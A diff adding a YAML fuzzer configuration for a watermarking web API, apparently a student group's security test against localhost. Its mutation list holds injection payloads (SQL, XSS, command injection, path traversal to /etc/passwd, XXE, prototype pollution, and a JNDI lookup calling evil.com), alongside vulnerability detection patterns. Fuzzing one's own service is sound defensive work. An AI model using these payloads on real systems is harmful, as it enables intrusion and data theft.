@@ -1,0 +1,291 @@
+# ============================================================
+# Tatou API Fuzzer Configuration
+# ============================================================
+# This configuration defines the fuzzing strategy for the Tatou API
+# Author: Group 18
+# Date: 2025-10-17
+# ============================================================
+
+# API Base Configuration
+api:
+  base_url: "http://localhost:5000"
+  timeout: 30
+  max_retries: 3
+
+# Authentication Configuration
+auth:
+  username: "fuzzer_test"
+  email: "fuzzer@test.com"
+  password: "FuzzerTest123!"
+  
+# Fuzzing Strategy
+fuzzing:
+  # Number of iterations per endpoint
+  iterations: 100
+  
+  # Fuzzing techniques to apply
+  techniques:
+    - boundary_values
+    - invalid_types
+    - injection_attacks
+    - authentication_bypass
+    - authorization_issues
+    - buffer_overflow
+    - format_string
+    - path_traversal
+    - command_injection
+    - sql_injection
+    - xss
+    - xxe
+    - ssrf
+    
+  # Mutation strategies
+  mutations:
+    string:
+      - ""  # empty string
+      - " "  # whitespace
+      - "null"
+      - "undefined"
+      - "NaN"
+      - "Infinity"
+      - "true"
+      - "false"
+      - "0"
+      - "-1"
+      - "9999999999"
+      - "../../../etc/passwd"
+      - "/etc/passwd"
+      - "'; DROP TABLE Users;--"
+      - "<script>alert('XSS')</script>"
+      - "${jndi:ldap://evil.com/a}"
+      - "{{7*7}}"
+      - "|whoami"
+      - "; ls -la"
+      - "../../../../../../etc/hosts"
+      - "%00"
+      - "\x00"
+      - "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # buffer overflow (100 A's)
+      - "%n%n%n%n"  # format string
+      - "1' OR '1'='1"
+      - "admin'--"
+      - "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
+      
+    integer:
+      - 0
+      - -1
+      - -2147483648
+      - 2147483647
+      - 9999999999
+      - null
+      
+    array:
+      - []
+      - [null]
+      - ["", "", ""]
+      - null
+      
+    object:
+      - {}
+      - null
+      - {"__proto__": {"admin": true}}
+
+# Target Endpoints for Fuzzing
+endpoints:
+  # Public endpoints (no auth required)
+  - name: "healthz"
+    method: "GET"
+    path: "/healthz"
+    auth_required: false
+    parameters: {}
+    
+  - name: "get-watermarking-methods"
+    method: "GET"
+    path: "/api/get-watermarking-methods"
+    auth_required: false
+    parameters: {}
+    
+  - name: "create-user"
+    method: "POST"
+    path: "/api/create-user"
+    auth_required: false
+    parameters:
+      login: "string"
+      password: "string"
+      email: "string"
+    
+  - name: "login"
+    method: "POST"
+    path: "/api/login"
+    auth_required: false
+    parameters:
+      email: "string"
+      password: "string"
+      
+  # Authenticated endpoints
+  - name: "upload-document"
+    method: "POST"
+    path: "/api/upload-document"
+    auth_required: true
+    content_type: "multipart/form-data"
+    parameters:
+      file: "file"
+      name: "string"
+      
+  - name: "list-documents"
+    method: "GET"
+    path: "/api/list-documents"
+    auth_required: true
+    parameters: {}
+    
+  - name: "get-document"
+    method: "GET"
+    path: "/api/get-document/{document_id}"
+    auth_required: true
+    parameters:
+      document_id: "integer"
+      
+  - name: "create-watermark"
+    method: "POST"
+    path: "/api/create-watermark/{document_id}"
+    auth_required: true
+    parameters:
+      document_id: "integer"
+      method: "string"
+      secret: "string"
+      intended_for: "string"
+      key: "string"
+      position: "string"
+      
+  - name: "read-watermark"
+    method: "POST"
+    path: "/api/read-watermark/{document_id}"
+    auth_required: true
+    parameters:
+      document_id: "integer"
+      method: "string"
+      key: "string"
+      position: "string"
+      
+  - name: "list-versions"
+    method: "GET"
+    path: "/api/list-versions/{document_id}"
+    auth_required: true
+    parameters:
+      document_id: "integer"
+      
+  - name: "list-all-versions"
+    method: "GET"
+    path: "/api/list-all-versions"
+    auth_required: true
+    parameters: {}
+    
+  - name: "delete-document"
+    method: "DELETE"
+    path: "/api/delete-document/{document_id}"
+    auth_required: true
+    parameters:
+      document_id: "integer"
+      
+  - name: "get-version"
+    method: "GET"
+    path: "/api/get-version/{link}"
+    auth_required: false
+    parameters:
+      link: "string"
+      
+  # RMAP endpoints
+  - name: "rmap-initiate"
+    method: "POST"
+    path: "/api/rmap-initiate"
+    auth_required: false
+    parameters:
+      payload: "string"
+      identity: "string"
+      nonceClient: "integer"
+      
+  - name: "rmap-get-link"
+    method: "POST"
+    path: "/api/rmap-get-link"
+    auth_required: false
+    parameters:
+      payload: "string"
+      doc_id: "integer"
+      requester_group: "string"
+      wm_method: "string"
+
+# Bug Detection Rules
+bug_detection:
+  # Response time thresholds (seconds)
+  slow_response: 5.0
+  timeout_threshold: 30.0
+  
+  # HTTP status codes indicating issues
+  error_codes:
+    - 500  # Internal Server Error
+    - 502  # Bad Gateway
+    - 503  # Service Unavailable
+    - 504  # Gateway Timeout
+    
+  # Patterns in response indicating vulnerabilities
+  vulnerability_patterns:
+    sql_injection:
+      - "SQL syntax"
+      - "mysql_fetch"
+      - "ORA-[0-9]+"
+      - "PostgreSQL"
+      - "SQLSTATE"
+      - "sqlite3.OperationalError"
+      
+    path_traversal:
+      - "root:x:0:0"
+      - "daemon"
+      - "/etc/passwd"
+      - "127.0.0.1"
+      
+    command_injection:
+      - "uid="
+      - "gid="
+      - "bin/bash"
+      - "bin/sh"
+      
+    information_disclosure:
+      - "Traceback"
+      - "File \""
+      - "line [0-9]+"
+      - "Exception"
+      - "Error"
+      - "Warning"
+      - "Stack trace"
+      - "password"
+      - "secret"
+      - "token"
+      - "api_key"
+      
+    xss:
+      - "<script>"
+      - "alert("
+      - "onerror="
+      
+    xxe:
+      - "<!DOCTYPE"
+      - "<!ENTITY"
+      
+  # Memory/performance issues
+  resource_exhaustion:
+    max_response_size: 10485760  # 10MB
+    max_memory_increase: 524288000  # 500MB
+
+# Output Configuration
+output:
+  bugs_file: "fuzzing/results/bugs_found.json"
+  regression_tests_dir: "fuzzing/regression_tests"
+  report_file: "fuzzing/results/fuzzing_report.md"
+  logs_dir: "fuzzing/logs"
+  
+# CI Integration
+ci:
+  enabled: true
+  fail_on_critical: true
+  fail_on_high: false
+  max_execution_time: 1800  # 30 minutes
+
